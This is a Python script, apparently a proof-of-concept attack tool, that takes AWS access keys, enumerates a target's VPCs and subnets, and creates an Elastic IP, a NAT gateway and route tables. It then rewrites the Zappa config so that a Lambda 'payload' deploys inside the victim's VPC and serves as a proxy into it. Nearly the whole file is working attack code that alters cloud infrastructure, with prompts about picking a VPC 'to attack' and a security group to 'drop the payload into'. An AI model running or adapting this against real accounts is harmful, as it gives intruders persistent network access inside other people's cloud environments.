# Cosmik Debris - Frank Zappa (1974)

'''
1) Find VPCs and subnets for attack
2) Select private subnet
3) Select public subnet
4) In public subnet:
  4a) Find or create igw
  4b) Find or create NAT gateway
  4c) create route 0.0.0.0/0 -> igw
5) In private subnet:
  5a) create route 0.0.0.0/0 -> NAT
  5b) SubnetID goes to Zappa
6) Get VPC security groups and choose one for Zappa config
7) Merge zappa config and subprocess zappa deploy

Our lambda has inbound traffic via API gateway and outbound traffic via:
Private subnet (Lambda) -> NAT Gateway (public subnet) -> Internet (via IGW)
'''

import boto3
import botocore
import argparse
import sys
import os
import time
import json
from collections import defaultdict

region = 'us-east-2'

def print_list(lst):
	print '\n'.join(['  - ' + i for i in lst])

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='Proxy into a VPC via AWS lambda')
	parser.add_argument('--access-key', help='AWS access key ID', metavar='KEY', required=True)
	parser.add_argument('--secret-key', help='AWS secret key', metavar='SECRET', required=True)

	args = parser.parse_args()

	if not os.path.isfile('zappa_settings.json'):
		print '[-] There should be zappa_settings.json file here. If there isn\'t one, try running zappa init.'
		sys.exit(1)

	print '[*] Creating clients'

	ec2 = boto3.resource(
		'ec2',
		aws_access_key_id=args.access_key,
		aws_secret_access_key=args.secret_key,
		region_name=region
	)

	ec2_client = boto3.client(
		'ec2',
		aws_access_key_id=args.access_key,
		aws_secret_access_key=args.secret_key,
		region_name=region
	)

	print '[*] Finding VPCs for attack'

	targets = []
	for vpc in ec2.vpcs.all():
		targets.append(vpc)
	
	subnets = defaultdict(list)
	if len(targets) > 1:	
		print '[!] Found %d VPC(s), select one to attack:' % (len(targets))
		for i in range(len(targets)):
			print '%d) VPC: %s (%s)' % (i + 1, targets[i].id, targets[i].cidr_block)
			for az in ec2.meta.client.describe_availability_zones()["AvailabilityZones"]:
				for subnet in targets[i].subnets.filter(Filters=[{"Name": "availabilityZone", "Values": [az["ZoneName"]]}]):
					subnets[targets[i].id].append(subnet)
					print '  - ' + subnet.id + ' (%s, Zone: %s)' % (subnet.cidr_block, az['ZoneName'])

		choice = raw_input('Enter a number (1 - %d): ' % (len(targets)))

		try:
			target = targets[int(choice) - 1]
		except ValueError:
			print '[-] Invalid choice. Exiting'
			sys.exit(1)

	elif len(targets) == 1:
		print '[+] Selecting %s by default' % (targets[0].id)
		target = targets[0]

	else:
		print '[!] No VPCs found or error retrieving them. Exiting.'
		sys.exit(1)

	sec_groups = [i for i in target.security_groups.all()]
	subnets = subnets[target.id]
	public_subnet = private_subnet = None
	if len(subnets) > 1:
		print '[!] More than one subnet found. We may be able to use the existing configuration'
		print '[*] Let\'s see if we can find out which one is public. Enumerating route tables.'
		rts = [i for i in target.route_tables.all()]
		if rts:
			print '[+] Found %d route table(s):' % (len(rts))
			print_list([i.id for i in rts])
			public_route = None
			for rt in rts:
				for route in rt.routes:
					if 'igw' in route.gateway_id and route.state == 'active' and route.destination_cidr_block == '0.0.0.0/0':
						print '[+] %s has an active route to an internet gateway, any subnet associated with this table will be our public subnet.' % (rt.id)
						public_route = rt

			if public_route:
				print '[*] Getting associations for %s' % (public_route.id)
				public_rt_assocs = public_route.associations
				if public_rt_assocs:
					print_list([i.id for i in public_rt_assocs])
					for association in public_rt_assocs:
						if association.subnet in subnets:
							print '[+] %s is in our VPC, it will be our public subnet.' % (association.subnet.id)
							public_subnet = association.subnet

				else:
					print '[-] Couldn\'t find any associations. Exiting.'
					sys.exit(1)

		else:
			print '[-] Couldn\'t find any route tables. Exiting.'
			sys.exit(1)

		if public_subnet:
			remaining_subnets = [i for i in subnets if i.id != public_subnet.id]
			if len(remaining_subnets) > 1:
				print '[!] Choose from the remaining subnets to place your lambda payload:'
				for i in range(len(remaining_subnets)):
					print '%d) Subnet: %s (%s)' % (i + 1, remaining_subnets[i].id, remaining_subnets[i].cidr_block)

				choice = raw_input('Enter a number (1 - %d): ' % (len(remaining_subnets)))
				try:
					private_subnet = remaining_subnets[int(choice) - 1]
				except ValueError:
					print '[-] Invalid choice. Exiting'
					sys.exit(1)

			elif len(remaining_subnets) == 1:
				print '[!] Choosing %s as the private subnet by default (only one remaining)' % (remaining_subnets[0].id)
				private_subnet = remaining_subnets[0]
			else:
				print '[-] No more subnets remaining. POC note: we\'re not creating additional subnets at the moment. Exiting.'
				sys.exit(1)
		else:
			print '[!] Couldn\'t find a public subnet. POC note: we don\'t support creating internet gateways yet. Exiting.'
			sys.exit(1)

	if public_subnet and private_subnet:
		print '[*] Getting a new EIP for a NAT Gateway'
		try:
			res = ec2_client.allocate_address(
				Domain='vpc'
			)
			if res and res['PublicIp']:
				eip_id = res['AllocationId']
				print '[+] Got an EIP: %s (%s)' % (res['PublicIp'], eip_id)
		except botocore.exceptions.ClientError as e:
			print '[-] EIP allocation failed'
			sys.exit(1)

		print '[*] Creating a NAT gateway'
		try:
			res = ec2_client.create_nat_gateway(
				AllocationId=eip_id,
				SubnetId=public_subnet.id
			)
			if res and res['NatGateway']:
				nat_id = res['NatGateway']['NatGatewayId']
				print'[+] NAT gateway created: %s' % (nat_id)
				print '[!] The NAT gateway must be available before continuing. Waiting 3 minutes.'
				time.sleep(180)

		except botocore.exceptions.ClientError as e:
			print '[-] NAT Gateway creation failed'
			sys.exit(1)

		if len(sec_groups) > 1:
			print '[!] Choose one of the following security groups to drop the payload into:'
			for i in range(len(sec_groups)):
				print '%d) Security Group: %s (%s)' % (i + 1, sec_groups[i].id, sec_groups[i].description)

			choice = raw_input('Enter a number (1 - %d): ' % (len(sec_groups)))
			try:
				sec_group = sec_groups[int(choice) - 1]
			except ValueError:
				print '[-] Invalid choice. Exiting'
				sys.exit(1)

		elif len(sec_groups) == 1:
			print '[+] Choosing %s as our security group by default' % (sec_groups[0].id)
			sec_group = sec_groups[0]

		else:
			print '[-] There needs to be at least one security group. Exiting.'
			sys.exit(1)

		print '[+] Creating a route table for our lambda payload'
		try:
			private_rt = target.create_route_table()
			if private_rt:
				print('[+] Route table %s created!' % (private_rt.id))
				route = private_rt.create_route(
					DestinationCidrBlock='0.0.0.0/0',
					NatGatewayId=nat_id,
				)
				if route:
					print('[+] NAT Gateway route created for %s' % (private_rt.id))
					res = private_rt.associate_with_subnet(
						SubnetId=private_subnet.id
					)
					if res:
						print('[+] Route associated with %s' % (private_subnet.id))
					else:
						print('[-] Route association failed')
				else:
					print('[-] Couldn\'t create a route for %s' % (private_subnet.id))
					sys.exit(1)

		except botocore.exceptions.ClientError as e:
			print('[-] Route creation failed')
			sys.exit(1)
	else:
		print '[-] Couldn\'t resolve targets for public and private subnets. Exiting.'
		sys.exit(1)

	with open('zappa_settings.json', 'r') as f:
		data = json.loads(f.read())

	data['dev']['vpc_config'] = {
		'SubnetIds': [ private_subnet.id ],
		'SecurityGroupIds': [ sec_group.id ]
	}

	with open('zappa_settings.json', 'w') as f:
		f.write(json.dumps(data, indent=4, sort_keys=True))
	print '[+] New zappa_settings.json written! Run zappa deploy dev!'